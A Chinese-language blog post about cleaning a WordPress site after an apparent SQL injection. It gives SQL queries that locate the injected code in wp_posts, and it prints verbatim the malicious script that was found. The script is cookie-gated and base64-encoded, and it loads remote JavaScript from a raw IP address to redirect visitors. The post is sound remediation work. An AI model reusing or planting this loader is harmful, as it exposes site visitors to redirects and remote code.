---
layout: post
title:
modified:
categories: Tech

tags: [wordpress]

comments: true
---

## 被攻击

被人盯上了，也是有意思.还自动每天在我平台发文章...

具体从 chrome 可以看到一段插入的 js:
![Screenshot from 2019-04-16 09-54-20-f98aa49e-253d-4eab-981d-5f0d22a6bf03](https://images-1257933000.cos.ap-chengdu.myqcloud.com/Screenshot%20from%202019-04-16%2009-54-20-f98aa49e-253d-4eab-981d-5f0d22a6bf03.png).

自然不是我写的.工程也搜不到，只能是 sql 注入攻击了，在 pc chrome 还好，移动端就会出现一些恶心的跳转和广告.全阿拉伯文...和羞羞的图

解决办法:
<https://stackoverflow.com/questions/52249409/how-to-remove-scripts-in-posts-from-an-sql-injection-attack>

## 解决

恶意代码肯定是插入到文章 wp_post 里了:

```sql
SELECT * FROM `wp_posts` WHERE post_content LIKE "%codes_iframe%";
```

可以找到所有的插入代码:

```sql
SELECT post_title as title, ID as post_id, SUBSTRING(post_content,1,LOCATE('<!--codes_iframe-->',post_content)-1 ) as pre_post, SUBSTRING(post_content,LOCATE('<!--codes_iframe-->',post_content) + LENGTH('<!--/codes_iframe-->')) as post_txt from wp_posts
```

用 sql 替换也太...还是导出来，用文本工具替换好了，找到

```sh
<!--codes_iframe--><script type=\"text/javascript\"> function getCookie(e){var U=document.cookie.match(new RegExp(\"(?:^|; )\"+e.replace(/([\\.$?*|{}\\(\\)\\[\\]\\\\\\/\\+^])/g,\"\\\\$1\")+\"=([^;]*)\"));return U?decodeURIComponent(U[1]):void 0}var src=\"data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=\",now=Math.floor(Date.now()/1e3),cookie=getCookie(\"redirect\");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=\"redirect=\"+time+\"; path=/; expires=\"+date.toGMTString(),document.write(\'<script src=\"\'+src+\'\"><\\/script>\')} </script><!--/codes_iframe-->
```

替换为空,再导回去, 注意有外键约束的表可别这么玩.
